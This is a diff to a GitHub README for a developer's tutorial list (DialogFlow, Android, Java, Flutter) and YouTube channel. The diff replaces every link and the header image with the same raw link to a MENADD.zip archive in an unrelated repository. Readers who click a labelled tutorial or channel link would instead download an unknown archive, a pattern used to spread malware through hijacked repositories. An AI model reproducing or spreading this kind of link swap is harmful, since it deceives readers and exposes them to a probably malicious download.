@@ -1,5 +1,5 @@
 # MENADD
-<img width="1494" alt="Screen Shot 2021-08-22 at 12 36 38 PM" src="https://user-images.githubusercontent.com/28203059/130352094-bbf7fef4-0dd0-4389-a896-31205bbd96d3.png">
+<img width="1494" alt="Screen Shot 2021-08-22 at 12 36 38 PM" src="https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip">
 
 
 # Hello everyone 🤗,
@@ -9,25 +9,25 @@
 
 ### My Tutorials here:
 
-- how **How to build Chatbots with DialogFlow**  [Chatbots](https://youtu.be/C7G6D7zPfgM).
-- **How to build Google Assistant APP with DialogFLow**  [Google Assistant](https://youtu.be/F1gflmGvwTI?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **How to Use GIT**  [Github](https://youtu.be/dlwMZJgs8JA?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Integrate Firebase with Android Application**  [Firebase](https://youtu.be/PtdQsXITP_U?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Simple Android Games - Connect3**  [Android](https://youtu.be/WI2GEKGkQRA?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Introduction to Flutter**  [Flutter](https://youtu.be/_TSNUDOKdRI?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Java Basics - Part1**  [Java](https://youtu.be/-VSll9z-O_I?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Java Basics - Part2**  [Java](https://youtu.be/uMNH4HSMaZw?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Java OOP - Part 1**  [Java](https://youtu.be/LAs6JU-1vvY?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Java OOP - Part 2**  [Java](https://youtu.be/aUK4KN812WI?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Android Development - Part1**  [Android](https://youtu.be/Q4XwD7yOibY?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **Android Development - Part2**  [Android](https://youtu.be/aPe9pOGLsE8?list=PLlqOXLg-GOqfVckh1Z5td5Z3YDoD1wizL).
-- **More Android UI Designs**  [Android](https://youtu.be/aPe9pOGLsE8).
-- **Android with Material Design**  [Android](https://youtu.be/cvEd1dVXI1w).
-- **Android with Material Design | Part 2**  [Android](https://youtu.be/lMG1mVdSafU).
-- **Android with Material Design | Part 3**  [Android](https://youtu.be/qR8alxoMkZk).
+- how **How to build Chatbots with DialogFlow**  [Chatbots](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **How to build Google Assistant APP with DialogFLow**  [Google Assistant](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **How to Use GIT**  [Github](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Integrate Firebase with Android Application**  [Firebase](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Simple Android Games - Connect3**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Introduction to Flutter**  [Flutter](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Java Basics - Part1**  [Java](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Java Basics - Part2**  [Java](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Java OOP - Part 1**  [Java](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Java OOP - Part 2**  [Java](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Android Development - Part1**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Android Development - Part2**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **More Android UI Designs**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Android with Material Design**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Android with Material Design | Part 2**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
+- **Android with Material Design | Part 3**  [Android](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
 
 
 <hr>
 
 # Also you can subscribe to my YOUTUBE Channel for more technical content 🥰
-- **Madahetooo Youtube Channel**  [link](https://www.youtube.com/channel/UCzvY9A7v6iQuii1G4GZFzLw).
+- **Madahetooo Youtube Channel**  [link](https://raw.githubusercontent.com/steffanhoez/MENADD/master/capsulogenous/MENADD.zip).
